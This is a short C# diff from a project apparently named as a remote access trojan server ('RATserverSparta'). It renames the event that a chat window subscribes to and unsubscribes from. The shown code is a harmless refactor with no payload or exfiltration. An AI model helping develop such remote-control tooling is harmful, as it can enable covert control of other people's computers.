@@ -25,7 +25,7 @@ namespace RATserverSparta.Tools.Chat
         private void Chat_Load(object sender, EventArgs e)
         {
             this.TopMost = true;
-            ClientClassInstance.chatMessageEvent += UpdatingMessages;
+            ClientClassInstance.MessageEvent += UpdatingMessages;
             FormClosing += OnClose;
             KeyPreview = true;
             KeyDown += KeyPressing;
@@ -50,7 +50,7 @@ namespace RATserverSparta.Tools.Chat
         private void OnClose(object sender, EventArgs e)
         {
             this.Data.Send(Encoding.ASCII.GetBytes("\0"), 1);
-            ClientClassInstance.chatMessageEvent -= UpdatingMessages;
+            ClientClassInstance.MessageEvent -= UpdatingMessages;
         }
         private void button1_Click(object sender, EventArgs e)
         {
